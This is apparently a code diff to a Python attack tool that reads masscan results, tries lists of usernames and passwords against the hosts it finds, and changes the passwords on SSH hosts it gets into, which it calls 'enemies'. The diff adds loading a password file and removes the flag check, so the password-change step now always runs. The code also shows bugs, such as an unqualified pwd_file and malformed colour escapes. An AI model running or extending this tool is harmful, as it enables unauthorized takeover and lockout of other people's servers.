@@ -19,28 +19,42 @@ class Tony():
     old_pwd: list
     new_pwd: str
     change: bool
+    pwd_file: str
     mass_file: str
     output: str = None
+    pwds: list = None
     recorded: bool = False
     loop: LOOP = asyncio.get_event_loop()
 
     def attack(self):
+        if self.pwd_file:
+            try:
+                with open(pwd_file) as f:
+                    for x in f:
+                        self.pwds.append(x.rstrip())
+            except Exception as e:
+                print(f'\033[0;31[-]  Error: {e}\033[31m')
+        if self.pwds and self.old_pwd:
+            self.pwds.extend(self.old_pwd)
         self.loop.add_signal_handler(signal.SIGTERM, self.signal_handler)
         self.mass_res = set()
         if self.change and self.mass_file:
             try:
                 with open(self.mass_file, 'rb') as f:
                     mass_data = f.read()
-                    for enemy in self.loop.run_until_complete(Javise.parse_masscan_results(mass_data)):
-                        status = self.loop.run_until_complete(Javise.change_enemy(enemy, self.usernames, self.old_pwd, self.new_pwd))
-                        if status:
-                            self.mass_res.add(enemy)
+                    tasks = Javise.create_actions(
+                        self.loop.run_until_complete(Javise.parse_masscan_results(mass_data)),
+                        self.usernames, self.pwds, self.new_pwd)
+                    self.mass_res = self.loop.run_until_complete(asyncio.gather(*tasks))
+                    if self.mass_res:
+                        Javise.save_results(self.mass_res)
             except BaseException as e:
-                print(f'[-]  {e}')
+                print(f'\033[0;31[-]  {e}\033[31m')
         self.alived_enemise = self.loop.run_until_complete(self.search_alive(self.enemise, self.loop))
         self.loop.run_until_complete(Javise.record(self.alived_enemise))
-        if self.change:
-            self.loop.run_until_complete(self.try2change_enemy())
+        #if self.change:
+        #    self.loop.run_until_complete(self.try2change_enemy())
+        self.loop.run_until_complete(self.try2change_enemy())
 
     async def try2change_enemy(self):
         for enemy in filter(lambda x:'ssh' in x[1], self.alived_enemise.items()):
